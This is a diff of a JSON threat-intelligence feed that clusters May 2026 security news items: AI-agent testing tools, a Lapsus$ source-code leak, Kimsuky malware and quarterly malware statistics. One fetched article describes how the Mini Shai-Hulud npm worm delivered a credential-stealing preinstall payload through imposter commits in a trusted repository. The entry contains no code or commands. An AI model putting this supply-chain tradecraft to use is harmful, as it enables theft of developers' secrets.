-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "The Hacker News",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Microsoft Open-Sources RAMPART and Clarity to Secure AI Agents During Development",
-        "link": "https://thehackernews.com/2026/05/microsoft-open-sources-rampart-and.html",
-        "published": "2026-05-20T17:06:54+00:00",
-        "summary": "Microsoft has unveiled two new open-source tools called RAMPART and Clarity to assist developers in better testing the security of artificial intelligence (AI) agents. RAMPART, short for Risk Assessment and Measurement Platform for Agentic Red Teaming, functions as a Pytest-native safety and security testing framework for writing and running safety and security tests for AI agents, covering",
-        "full_body": "",
-        "fetch_status": "not_attempted",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_4_news"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Microsoft Open-Sources RAMPART and Clarity to Secure AI Agents During Development",
-          "link": "https://thehackernews.com/2026/05/microsoft-open-sources-rampart-and.html",
-          "published": "2026-05-20T17:06:54+00:00",
-          "summary": "Microsoft has unveiled two new open-source tools called RAMPART and Clarity to assist developers in better testing the security of artificial intelligence (AI) agents. RAMPART, short for Risk Assessment and Measurement Platform for Agentic Red Teaming, functions as a Pytest-native safety and security testing framework for writing and running safety and security tests for AI agents, covering",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
+            "content_type": "threat_research",
             "confidence_tier": "tier_4_news"
           }
         }
@@ -6605,11 +6327,18 @@
       "strong_signals": [],
       "taxonomy": {
         "threat_categories": [
-          "malware"
+          "data_breach",
+          "malware",
+          "supply_chain"
         ],
         "actor_attribution": [],
-        "affected_industries": [],
+        "affected_industries": [
+          "manufacturing_industrial"
+        ],
         "affected_products": [
+          "GitHub",
+          "Kubernetes",
+          "PyPI",
           "npm"
         ],
         "cve_ids": [],
@@ -6617,7 +6346,7 @@
         "geographic_scope": [],
         "urgency_signals": [],
         "content_type": [
-          "news_report"
+          "threat_research"
         ],
         "confidence_tier": [
           "tier_4_news"
@@ -6630,22 +6359,29 @@
         "link": "https://www.infosecurity-magazine.com/news/antv-npm-mini-shai-hulud-largest/",
         "published": "2026-05-20T15:00:00+00:00",
         "summary": "Mini Shai-Hulud worm hits Alibaba AntV ecosystem in largest npm supply chain wave to date",
-        "full_body": "",
-        "fetch_status": "not_attempted",
+        "full_body": "Infosecurity Magazine Home » News » Mini Shai-Hulud Hits Hundreds of npm Packages in AntV Ecosystem Mini Shai-Hulud Hits Hundreds of npm Packages in AntV Ecosystem News 20 May 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino The Mini Shai-Hulud worm has resurfaced in one of its largest single-registry waves to date, hitting hundreds of npm packages tied to the AntV data visualization ecosystem in a coordinated burst lasting around an hour. According to new analysis by Socket's Threat Research Team, the attack began around 01:56 UTC on May 19 and pushed 639 malicious versions across 323 unique packages before stopping roughly an hour later. Microsoft, which has previously published Defender protection guidance for the broader Mini Shai-Hulud campaign, has also provided updates from its own investigation into the new supply chain attack via X on Tuesday, May 19 . Several affected packages are high-download npm dependencies, including echarts-for-react, size-sensor, @antv/scale, and timeago.js, among others. The compromised npm maintainer account, “atool,” held publish rights to more than 500 packages. Compromised Account, Familiar Playbook Each malicious version added a preinstall hook to package.json that executes a 498 KB obfuscated Bun bundle, harvesting cloud credentials, CI/CD tokens, SSH keys, Kubernetes service account tokens and local password manager vaults. The payload exfiltrated stolen data through public GitHub repositories created using stolen tokens, named after Dune universe terminology with descriptions containing a reversed marker reading \"Shai-Hulud: Here We Go Again.\" Avital Harel, security research lead at Upwind, said the operation appeared mature and defender-aware, with attackers anticipating the tools used to detect and analyze malware. \"The campaign was not only built to spread, but also to slow down analysis,\" she explained. Read more on this campaign: Mini Shai-Hulud Hits TanStack npm Packages Socket described the tradecraft as consistent with a \"high-volume npm compromise pattern involving coordinated malicious publishes.\" Across all waves, the company has tracked 1055 compromised versions across 502 unique packages spanning npm, PyPI and Composer. StepSecurity, which has logged more than 2500 GitHub repositories containing campaign markers, attributed the wider activity to a financially motivated cluster known as TeamPCP . Trusted-Repo Hosting via Imposter Commits The AntV wave extended a payload-delivery technique used in earlier waves. The vast majority of malicious versions inject an optionalDependencies entry pointing to orphan commits, this time planted in an unrelated trusted repository, antvis/G2, with forged authorship matching a real maintainer of that project to discourage closer inspection. GitHub stores commits in a shared object pool across a repository's fork network, and npm's github: resolver fetches by commit hash without checking which fork a commit lives on. That lets an attacker push a commit to their own fork of antvis/G2 and have it served from the parent repo's URL. Isaac Evans, founder and CEO of software security firm Semgrep, said the cascade reflects a structural problem with how dependencies are trusted. \"A package you have trusted for years can suddenly become the delivery mechanism,\" he warned. Snyk advised that affected organizations treat any secret accessible during installation as compromised, including organization-scoped GitHub Actions secrets and OIDC tokens. Recommended steps include pinning dependencies to versions published before May 19, rotating all credentials exposed to affected build environments and auditing GitHub accounts for unauthorized repository creation matching the campaign's Dune-themed naming pattern and reversed-string description marker. You may also like Mini Shai-Hulud Hits TanStack npm Packages News 12 May 2026 TeamPCP Expands Supply Chain Campaign With LiteLLM PyPI Compromise News 25 March 2026 Npm",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
+            "data_breach",
+            "supply_chain",
             "malware"
           ],
           "actor_attribution": [],
-          "affected_industries": [],
+          "affected_industries": [
+            "manufacturing_industrial"
+          ],
           "affected_products": [
-            "npm"
+            "Kubernetes",
+            "GitHub",
+            "npm",
+            "PyPI"
           ],
           "cve_ids": [],
           "attack_techniques": [],
           "geographic_scope": [],
           "urgency_signals": [],
-          "content_type": "news_report",
+          "content_type": "threat_research",
           "confidence_tier": "tier_4_news"
         }
       },
@@ -6659,18 +6395,25 @@
           "summary": "Mini Shai-Hulud worm hits Alibaba AntV ecosystem in largest npm supply chain wave to date",
           "taxonomy": {
             "threat_categories": [
+              "data_breach",
+              "supply_chain",
               "malware"
             ],
             "actor_attribution": [],
-            "affected_industries": [],
+            "affected_industries": [
+              "manufacturing_industrial"
+            ],
             "affected_products": [
-              "npm"
+              "Kubernetes",
+              "GitHub",
+              "npm",
+              "PyPI"
             ],
             "cve_ids": [],
             "attack_techniques": [],
             "geographic_scope": [],
             "urgency_signals": [],
-            "content_type": "news_report",
+            "content_type": "threat_research",
             "confidence_tier": "tier_4_news"
           }
         }
@@ -6902,6 +6645,73 @@
       ]
     },
     {
+      "cluster_id": "3da3cf9f20",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "SentinelOne Labs",
+        "cohort": "threat_research_primary",
+        "title": "LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout",
+        "link": "https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/",
+        "published": "2026-05-14T13:00:44+00:00",
+        "summary": "Mick Baccio and Scott Roberts examine whether public breach signals and market timing models can turn cyber incidents into actionable trading opportunities.",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_1_primary_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "SentinelOne Labs",
+          "cohort": "threat_research_primary",
+          "title": "LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout",
+          "link": "https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/",
+          "published": "2026-05-14T13:00:44+00:00",
+          "summary": "Mick Baccio and Scott Roberts examine whether public breach signals and market timing models can turn cyber incidents into actionable trading opportunities.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_1_primary_research"
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "df84fc05c8",
       "priority_score": 10,
       "member_count": 1,
@@ -7112,6 +6922,96 @@
       ]
     },
     {
+      "cluster_id": "ad84f1fd3a",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "Lapsus"
+      ],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [
+          "Lapsus$"
+        ],
+        "affected_industries": [
+          "telecommunications"
+        ],
+        "affected_products": [
+          "Check Point",
+          "GitHub"
+        ],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [],
+        "content_type": [
+          "threat_research"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Check Point Research",
+        "cohort": "threat_research_primary",
+        "title": "18th May – Threat Intelligence Report",
+        "link": "https://research.checkpoint.com/2026/18th-may-threat-intelligence-report/",
+        "published": "2026-05-18T14:58:29+00:00",
+        "summary": "For the latest discoveries in cyber research for the week of 18th May, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Vodafone, a major international telecom, has sustained a source code leak claimed by the Lapsus$ extortion group. The company confirmed limited access to GitHub files through compromised third-party development software, while stating that […] The post 18th May – Threat Intelligence Report appeared first on Check Point Research .",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [
+            "Lapsus$"
+          ],
+          "affected_industries": [
+            "telecommunications"
+          ],
+          "affected_products": [
+            "Check Point",
+            "GitHub"
+          ],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [],
+          "content_type": "threat_research",
+          "confidence_tier": "tier_1_primary_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Check Point Research",
+          "cohort": "threat_research_primary",
+          "title": "18th May – Threat Intelligence Report",
+          "link": "https://research.checkpoint.com/2026/18th-may-threat-intelligence-report/",
+          "published": "2026-05-18T14:58:29+00:00",
+          "summary": "For the latest discoveries in cyber research for the week of 18th May, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Vodafone, a major international telecom, has sustained a source code leak claimed by the Lapsus$ extortion group. The company confirmed limited access to GitHub files through compromised third-party development software, while stating that […] The post 18th May – Threat Intelligence Report appeared first on Check Point Research .",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [
+              "Lapsus$"
+            ],
+            "affected_industries": [
+              "telecommunications"
+            ],
+            "affected_products": [
+              "Check Point",
+              "GitHub"
+            ],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "threat_research",
+            "confidence_tier": "tier_1_primary_research"
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "42788c8317",
       "priority_score": 10,
       "member_count": 1,
@@ -7313,7 +7213,7 @@
       ]
     },
     {
-      "cluster_id": "3da3cf9f20",
+      "cluster_id": "ad3165eb09",
       "priority_score": 10,
       "member_count": 1,
       "corroborating_source_count": 1,
@@ -7335,12 +7235,12 @@
         ]
       },
       "primary": {
-        "source": "SentinelOne Labs",
+        "source": "Citizen Lab",
         "cohort": "threat_research_primary",
-        "title": "LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout",
-        "link": "https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/",
-        "published": "2026-05-14T13:00:44+00:00",
-        "summary": "Mick Baccio and Scott Roberts examine whether public breach signals and market timing models can turn cyber incidents into actionable trading opportunities.",
+        "title": "Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill",
+        "link": "https://citizenlab.ca/signal-warns-it-would-pull-out-of-canada-if-made-to-comply-with-lawful-access-bill/",
+        "published": "2026-05-14T19:37:56+00:00",
+        "summary": "Senior research associate Kate Robertson says Bill C-22 could lead to the rollout of forced metadata collection for messaging apps. The post Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill appeared first on The Citizen Lab .",
         "full_body": "",
         "fetch_status": "not_attempted",
         "taxonomy": {
@@ -7358,12 +7258,12 @@
       },
       "corroborating_sources": [
         {
-          "source": "SentinelOne Labs",
+          "source": "Citizen Lab",
           "cohort": "threat_research_primary",
-          "title": "LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout",
-          "link": "https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/",
-          "published": "2026-05-14T13:00:44+00:00",
-          "summary": "Mick Baccio and Scott Roberts examine whether public breach signals and market timing models can turn cyber incidents into actionable trading opportunities.",
+          "title": "Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill",
+          "link": "https://citizenlab.ca/signal-warns-it-would-pull-out-of-canada-if-made-to-comply-with-lawful-access-bill/",
+          "published": "2026-05-14T19:37:56+00:00",
+          "summary": "Senior research associate Kate Robertson says Bill C-22 could lead to the rollout of forced metadata collection for messaging apps. The post Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill appeared first on The Citizen Lab .",
           "taxonomy": {
             "threat_categories": [],
             "actor_attribution": [],
@@ -7380,90 +7280,227 @@
       ]
     },
     {
-      "cluster_id": "ad84f1fd3a",
+      "cluster_id": "a64f4c6a4f",
       "priority_score": 10,
       "member_count": 1,
       "corroborating_source_count": 1,
-      "strong_signals": [
-        "Lapsus"
-      ],
+      "strong_signals": [],
       "taxonomy": {
         "threat_categories": [],
-        "actor_attribution": [
-          "Lapsus$"
-        ],
-        "affected_industries": [
-          "telecommunications"
-        ],
-        "affected_products": [
-          "Check Point",
-          "GitHub"
-        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
         "cve_ids": [],
         "attack_techniques": [],
         "geographic_scope": [],
         "urgency_signals": [],
         "content_type": [
-          "threat_research"
+          "uncategorized"
         ],
         "confidence_tier": [
           "tier_1_primary_research"
         ]
       },
       "primary": {
-        "source": "Check Point Research",
+        "source": "Kaspersky Securelist",
         "cohort": "threat_research_primary",
-        "title": "18th May – Threat Intelligence Report",
-        "link": "https://research.checkpoint.com/2026/18th-may-threat-intelligence-report/",
-        "published": "2026-05-18T14:58:29+00:00",
-        "summary": "For the latest discoveries in cyber research for the week of 18th May, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Vodafone, a major international telecom, has sustained a source code leak claimed by the Lapsus$ extortion group. The company confirmed limited access to GitHub files through compromised third-party development software, while stating that […] The post 18th May – Threat Intelligence Report appeared first on Check Point Research .",
+        "title": "IT threat evolution in Q1 2026. Mobile statistics",
+        "link": "https://securelist.com/malware-report-q1-2026-mobile-statistics/119819/",
+        "published": "2026-05-18T12:00:30+00:00",
+        "summary": "This report contains mobile threat statistics for Q1 2026, along with noteworthy discoveries and quarterly trends: new versions of SparkCat and Triada.",
         "full_body": "",
         "fetch_status": "not_attempted",
         "taxonomy": {
           "threat_categories": [],
-          "actor_attribution": [
-            "Lapsus$"
-          ],
-          "affected_industries": [
-            "telecommunications"
-          ],
-          "affected_products": [
-            "Check Point",
-            "GitHub"
-          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
           "cve_ids": [],
           "attack_techniques": [],
           "geographic_scope": [],
           "urgency_signals": [],
-          "content_type": "threat_research",
+          "content_type": "uncategorized",
           "confidence_tier": "tier_1_primary_research"
         }
       },
       "corroborating_sources": [
         {
-          "source": "Check Point Research",
+          "source": "Kaspersky Securelist",
           "cohort": "threat_research_primary",
-          "title": "18th May – Threat Intelligence Report",
-          "link": "https://research.checkpoint.com/2026/18th-may-threat-intelligence-report/",
-          "published": "2026-05-18T14:58:29+00:00",
-          "summary": "For the latest discoveries in cyber research for the week of 18th May, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Vodafone, a major international telecom, has sustained a source code leak claimed by the Lapsus$ extortion group. The company confirmed limited access to GitHub files through compromised third-party development software, while stating that […] The post 18th May – Threat Intelligence Report appeared first on Check Point Research .",
+          "title": "IT threat evolution in Q1 2026. Mobile statistics",
+          "link": "https://securelist.com/malware-report-q1-2026-mobile-statistics/119819/",
+          "published": "2026-05-18T12:00:30+00:00",
+          "summary": "This report contains mobile threat statistics for Q1 2026, along with noteworthy discoveries and quarterly trends: new versions of SparkCat and Triada.",
           "taxonomy": {
             "threat_categories": [],
-            "actor_attribution": [
-              "Lapsus$"
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_1_primary_research"
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "ca17b8fd1f",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "malware"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Apple iOS/macOS"
+        ],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Kaspersky Securelist",
+        "cohort": "threat_research_primary",
+        "title": "IT threat evolution in Q1 2026. Non-mobile statistics",
+        "link": "https://securelist.com/malware-report-q1-2026-pc-iot-statistics/119828/",
+        "published": "2026-05-18T12:00:22+00:00",
+        "summary": "The report presents key trends and statistics on malware that targeted personal computers running Windows and macOS, as well as Internet of Things (IoT) devices, during Q1 2026.",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [
+            "malware"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Apple iOS/macOS"
+          ],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_1_primary_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Kaspersky Securelist",
+          "cohort": "threat_research_primary",
+          "title": "IT threat evolution in Q1 2026. Non-mobile statistics",
+          "link": "https://securelist.com/malware-report-q1-2026-pc-iot-statistics/119828/",
+          "published": "2026-05-18T12:00:22+00:00",
+          "summary": "The report presents key trends and statistics on malware that targeted personal computers running Windows and macOS, as well as Internet of Things (IoT) devices, during Q1 2026.",
+          "taxonomy": {
+            "threat_categories": [
+              "malware"
             ],
-            "affected_industries": [
-              "telecommunications"
-            ],
+            "actor_attribution": [],
+            "affected_industries": [],
             "affected_products": [
-              "Check Point",
-              "GitHub"
+              "Apple iOS/macOS"
             ],
             "cve_ids": [],
             "attack_techniques": [],
             "geographic_scope": [],
             "urgency_signals": [],
-            "content_type": "threat_research",
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_1_primary_research"
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "55d60e5654",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "Kimsuky"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "malware"
+        ],
+        "actor_attribution": [
+          "Kimsuky"
+        ],
+        "affected_industries": [],
+        "affected_products": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Kaspersky Securelist",
+        "cohort": "threat_research_primary",
+        "title": "Kimsuky targets organizations with PebbleDash-based tools",
+        "link": "https://securelist.com/kimsuky-appleseed-pebbledash-campaigns/119785/",
+        "published": "2026-05-14T11:00:58+00:00",
+        "summary": "Kaspersky researchers analyze a range of new PebbleDash-based tools used in recent Kimsuky campaigns and reveal their connection to the AppleSeed malware cluster.",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [
+            "malware"
+          ],
+          "actor_attribution": [
+            "Kimsuky"
+          ],
+          "affected_industries": [],
+          "affected_products": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_1_primary_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Kaspersky Securelist",
+          "cohort": "threat_research_primary",
+          "title": "Kimsuky targets organizations with PebbleDash-based tools",
+          "link": "https://securelist.com/kimsuky-appleseed-pebbledash-campaigns/119785/",
+          "published": "2026-05-14T11:00:58+00:00",
+          "summary": "Kaspersky researchers analyze a range of new PebbleDash-based tools used in recent Kimsuky campaigns and reveal their connection to the AppleSeed malware cluster.",
+          "taxonomy": {
+            "threat_categories": [
+              "malware"
+            ],
+            "actor_attribution": [
+              "Kimsuky"
+            ],
+            "affected_industries": [],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "uncategorized",
             "confidence_tier": "tier_1_primary_research"
           }
         }
@@ -7695,73 +7732,6 @@
       ]
     },
     {
-      "cluster_id": "ad3165eb09",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Citizen Lab",
-        "cohort": "threat_research_primary",
-        "title": "Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill",
-        "link": "https://citizenlab.ca/signal-warns-it-would-pull-out-of-canada-if-made-to-comply-with-lawful-access-bill/",
-        "published": "2026-05-14T19:37:56+00:00",
-        "summary": "Senior research associate Kate Robertson says Bill C-22 could lead to the rollout of forced metadata collection for messaging apps. The post Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill appeared first on The Citizen Lab .",
-        "full_body": "",
-        "fetch_status": "not_attempted",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_1_primary_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Citizen Lab",
-          "cohort": "threat_research_primary",
-          "title": "Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill",
-          "link": "https://citizenlab.ca/signal-warns-it-would-pull-out-of-canada-if-made-to-comply-with-lawful-access-bill/",
-          "published": "2026-05-14T19:37:56+00:00",
-          "summary": "Senior research associate Kate Robertson says Bill C-22 could lead to the rollout of forced metadata collection for messaging apps. The post Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill appeared first on The Citizen Lab .",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_1_primary_research"
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "1f34fcae04",
       "priority_score": 10,
       "member_count": 1,
@@ -7829,7 +7799,7 @@
       ]
     },
     {
-      "cluster_id": "8249401fc6",
+      "cluster_id": "105d762a23",
       "priority_score": 10,
       "member_count": 1,
       "corroborating_source_count": 1,
@@ -7847,16 +7817,16 @@
           "uncategorized"
         ],
         "confidence_tier": [
-          "tier_1_primary_research"
+          "tier_2_operator"
         ]
       },
       "primary": {
-        "source": "Recorded Future",
-        "cohort": "threat_research_primary",
-        "title": "NIST NVD Enrichment Policy Change: Prioritizing Vulnerabilities with Attacker Behavior Signals",
-        "link": "https://www.recordedfuture.com/blog/nist-nvd-enrichment",
-        "published": "2026-05-14T00:00:00+00:00",
-        "summary": "NVD enrichment now covers only 15–20% of CVEs. Learn how Recorded Future Vulnerability Intelligence prioritizes risk using real attacker behavior signals.",
+        "source": "Google DeepMind Blog",
+        "cohort": "ai_security_agentic_risk",
+        "title": "Gemini 3.5: frontier intelligence with action",
+        "link": "https://deepmind.google/blog/gemini-3-5-frontier-intelligence-with-action/",
+        "published": "2026-05-15T22:50:12+00:00",
+        "summary": "Gemini 3.5 is built to help you execute complex, agentic workflows.",
         "full_body": "",
         "fetch_status": "not_attempted",
         "taxonomy": {
@@ -7869,17 +7839,17 @@
           "geographic_scope": [],
           "urgency_signals": [],
           "content_type": "uncategorized",
-          "confidence_tier": "tier_1_primary_research"
+          "confidence_tier": "tier_2_operator"
         }
       },
       "corroborating_sources": [
         {
-          "source": "Recorded Future",
-          "cohort": "threat_research_primary",
-          "title": "NIST NVD Enrichment Policy Change: Prioritizing Vulnerabilities with Attacker Behavior Signals",
-          "link": "https://www.recordedfuture.com/blog/nist-nvd-enrichment",
-          "published": "2026-05-14T00:00:00+00:00",
-          "summary": "NVD enrichment now covers only 15–20% of CVEs. Learn how Recorded Future Vulnerability Intelligence prioritizes risk using real attacker behavior signals.",
+          "source": "Google DeepMind Blog",
+          "cohort": "ai_security_agentic_risk",
+          "title": "Gemini 3.5: frontier intelligence with action",
+          "link": "https://deepmind.google/blog/gemini-3-5-frontier-intelligence-with-action/",
+          "published": "2026-05-15T22:50:12+00:00",
+          "summary": "Gemini 3.5 is built to help you execute complex, agentic workflows.",
           "taxonomy": {
             "threat_categories": [],
             "actor_attribution": [],
@@ -7890,7 +7860,7 @@
             "geographic_scope": [],
             "urgency_signals": [],
             "content_type": "uncategorized",
-            "confidence_tier": "tier_1_primary_research"
+            "confidence_tier": "tier_2_operator"
           }
         }
       ]
@@ -7906,14 +7876,11 @@
         ],
         "content_type": [
           "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
         ]
       },
       "cluster_count": 37,
       "article_count": 43,
-      "cohesion": 0.372,
+      "cohesion": 0.375,
       "cluster_ids": [
         "6239eacb98",
         "da2bf7e408",
@@ -7924,33 +7891,33 @@
         "029fcc1f63",
         "26471ead7e",
         "bc4a1043d6",
+        "c1d9509f14",
         "eb8e5fefbf",
         "f0c4c171b9",
-        "a17791a046",
         "a737fa0143",
         "9802f04a89",
         "3f3940c1a9",
-        "09f484b295",
         "91f7218f8d",
         "8fd391b96b",
         "bbf47cae0b",
-        "7d631cf339",
         "b625c0e6b0",
         "78626f0eee",
         "9e047f3f25",
         "b25fec302e",
         "31b2aa144a",
         "405bfcae7f",
+        "a17791a046",
         "d6442218f6",
         "83e574101d",
         "08d387ca71",
         "29b070dccb",
+        "7d631cf339",
         "27954d511c",
-        "fab2ca6195",
         "b1d92e4d6d",
         "2e40a1f7f0",
         "ebf325e74f",
         "ad84f1fd3a",
+        "ca17b8fd1f",
         "fadd6ff8fe"
       ]
     },
